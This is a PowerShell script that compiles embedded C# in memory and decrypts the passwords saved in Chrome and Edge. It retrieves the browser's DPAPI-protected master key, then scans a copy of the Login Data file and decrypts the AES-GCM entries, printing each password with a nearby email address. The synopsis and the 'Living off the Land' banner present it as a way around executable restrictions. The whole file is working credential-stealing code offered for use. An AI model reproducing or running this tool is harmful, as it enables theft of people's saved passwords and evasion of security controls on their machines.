<#
.SYNOPSIS
    Browser Password Decryptor (Memory Only)
    Bypasses .exe restrictions by compiling C# in memory via PowerShell.
#>

$Source = @"
using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace ChromePass
{
    public class Program
    {
        public static void Run()
        {
            Console.WriteLine("[*] Living off the Land - Memory-Only Decryptor");
            Console.WriteLine("[*] Mode: PowerShell Reflection (BCrypt/DPAPI)");
            Console.WriteLine("--------------------------------------------------");

            try
            {
                string localAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");
                
                var targets = new Dictionary<string, string>();
                targets.Add("Edge", Path.Combine(localAppData, @"Microsoft\Edge\User Data"));
                targets.Add("Chrome", Path.Combine(localAppData, @"Google\Chrome\User Data"));

                foreach (var target in targets)
                {
                    string browserName = target.Key;
                    string userDataPath = target.Value;

                    if (!Directory.Exists(userDataPath)) continue;

                    Console.WriteLine("\n[*] Found " + browserName + " directory: " + userDataPath);

                    // Get Master Key
                    byte[] masterKey = GetMasterKey(Path.Combine(userDataPath, "Local State"));
                    if (masterKey == null)
                    {
                        Console.WriteLine("[-] Could not retrieve master key for " + browserName);
                        continue;
                    }
                    Console.WriteLine("[+] Master Key retrieved (" + masterKey.Length + " bytes)");

                    // Find Login Data
                    string loginDataPath = Path.Combine(userDataPath, @"Default\Login Data");
                    if (!File.Exists(loginDataPath))
                    {
                        // Try "Default" first, if not check specific Profiles if needed.
                        Console.WriteLine("[-] Login Data not found at Default profile.");
                        continue;
                    }

                    ProcessLoginData(loginDataPath, masterKey);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Critical Error: " + ex.Message);
            }
        }

        static byte[] GetMasterKey(string localStatePath)
        {
            try
            {
                if (!File.Exists(localStatePath)) return null;
                string content = File.ReadAllText(localStatePath);
                
                // Regex JSON parsing
                var match = Regex.Match(content, "\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
                if (!match.Success) return null;

                byte[] encryptedKey = Convert.FromBase64String(match.Groups[1].Value);
                byte[] dataToDecrypt = new byte[encryptedKey.Length - 5];
                Array.Copy(encryptedKey, 5, dataToDecrypt, 0, encryptedKey.Length - 5);

                return Crypto.Unprotect(dataToDecrypt);
            }
            catch { return null; }
        }

        static void ProcessLoginData(string path, byte[] masterKey)
        {
            string tempFile = Path.GetTempFileName();
            File.Copy(path, tempFile, true);

            try
            {
                byte[] fileBytes = File.ReadAllBytes(tempFile);
                Console.WriteLine("[*] Scanning " + fileBytes.Length + " bytes for credentials...");
                
                int count = 0;

                // Heuristic Scanner for 'v10' (AES-GCM)
                for (int i = 0; i < fileBytes.Length - 30; i++)
                {
                    if (fileBytes[i] != 0x76) continue; // 'v'
                    if (fileBytes[i+1] == 0x31 && fileBytes[i+2] == 0x30) // '10'
                    {
                        try 
                        {
                            byte[] nonce = new byte[12];
                            Array.Copy(fileBytes, i + 3, nonce, 0, 12);

                            for (int len = 1; len < 100; len++) 
                            {
                                if (i + 3 + 12 + len + 16 >= fileBytes.Length) break;

                                byte[] ciphertext = new byte[len];
                                byte[] tag = new byte[16];

                                Array.Copy(fileBytes, i + 3 + 12, ciphertext, 0, len);
                                Array.Copy(fileBytes, i + 3 + 12 + len, tag, 0, 16);

                                string plaintext = Crypto.DecryptAesGcm(masterKey, nonce, ciphertext, tag);
                                if (plaintext != null && IsPrintable(plaintext))
                                {
                                    count++;
                                    Console.WriteLine("\n[+] Found Credential #" + count);
                                    Console.WriteLine("    Password: " + plaintext);
                                    
                                    string context = ExtractContext(fileBytes, i);
                                    if(!string.IsNullOrEmpty(context))
                                        Console.WriteLine("    Context:  " + context);
                                    
                                    i += (3 + 12 + len + 16); 
                                    break;
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            finally
            {
                if (File.Exists(tempFile)) File.Delete(tempFile);
            }
        }

        static bool IsPrintable(string text)
        {
            foreach (char c in text)
                if (char.IsControl(c) && c != '\r' && c != '\n' && c != '\t') return false;
            return true;
        }

        static string ExtractContext(byte[] data, int index)
        {
            try
            {
                int start = Math.Max(0, index - 200);
                int length = index - start;
                byte[] chunk = new byte[length];
                Array.Copy(data, start, chunk, 0, length);
                
                string raw = Encoding.ASCII.GetString(chunk);
                var matches = Regex.Matches(raw, @"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}");
                if (matches.Count > 0) return matches[matches.Count - 1].Value; 
                return "";
            }
            catch { return ""; }
        }
    }

    public static class Crypto
    {
        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB { public int cbData; public IntPtr pbData; }

        public static byte[] Unprotect(byte[] data)
        {
            DATA_BLOB inBlob = new DATA_BLOB();
            inBlob.cbData = data.Length;
            inBlob.pbData = Marshal.AllocHGlobal(data.Length);
            Marshal.Copy(data, 0, inBlob.pbData, data.Length);
            DATA_BLOB outBlob = new DATA_BLOB();

            try {
                if (CryptUnprotectData(ref inBlob, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref outBlob)) {
                    byte[] result = new byte[outBlob.cbData];
                    Marshal.Copy(outBlob.pbData, result, 0, result.Length);
                    return result;
                }
                return null;
            }
            finally {
                if (inBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(inBlob.pbData);
                if (outBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(outBlob.pbData);
            }
        }

        // BCrypt Definitions
        [DllImport("bcrypt.dll")] private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, int dwFlags);
        [DllImport("bcrypt.dll")] private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);
        [DllImport("bcrypt.dll")] private static extern int BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, [MarshalAs(UnmanagedType.LPWStr)] string pszInput, int cbInput, int dwFlags);
        [DllImport("bcrypt.dll")] private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
        [DllImport("bcrypt.dll")] private static extern int BCryptDestroyKey(IntPtr hKey);
        [DllImport("bcrypt.dll")] private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

        [StructLayout(LayoutKind.Sequential)]
        private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
            public int cbSize; public int dwInfoVersion; public IntPtr pbNonce; public int cbNonce;
            public IntPtr pbAuthData; public int cbAuthData; public IntPtr pbTag; public int cbTag;
            public IntPtr pbMacContext; public int cbMacContext; public int cbAAD; public long cbData; public int dwFlags;
        }

        public static string DecryptAesGcm(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag) {
            IntPtr hAlg = IntPtr.Zero; IntPtr hKey = IntPtr.Zero;
            try {
                if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
                if (BCryptSetProperty(hAlg, "ChainingMode", "ChainingModeGCM", 32, 0) != 0) return null;
                if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0) return null;

                var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
                authInfo.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
                authInfo.dwInfoVersion = 1;
                authInfo.pbNonce = Marshal.AllocHGlobal(nonce.Length);
                authInfo.cbNonce = nonce.Length;
                authInfo.pbTag = Marshal.AllocHGlobal(tag.Length);
                authInfo.cbTag = tag.Length;
                Marshal.Copy(nonce, 0, authInfo.pbNonce, nonce.Length);
                Marshal.Copy(tag, 0, authInfo.pbTag, tag.Length);

                byte[] plaintext = new byte[ciphertext.Length];
                int bytesWritten = 0;
                int status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref authInfo, null, 0, plaintext, plaintext.Length, out bytesWritten, 0);

                Marshal.FreeHGlobal(authInfo.pbNonce);
                Marshal.FreeHGlobal(authInfo.pbTag);

                if (status != 0) return null;
                return Encoding.UTF8.GetString(plaintext, 0, bytesWritten);
            }
            catch { return null; }
            finally {
                if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
                if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
            }
        }
    }
}
"@

# Compile the C# code in memory using the native C# compiler (no .exe file created)
Add-Type -TypeDefinition $Source -Language CSharp

# Run the Entry Point
[ChromePass.Program]::Run()
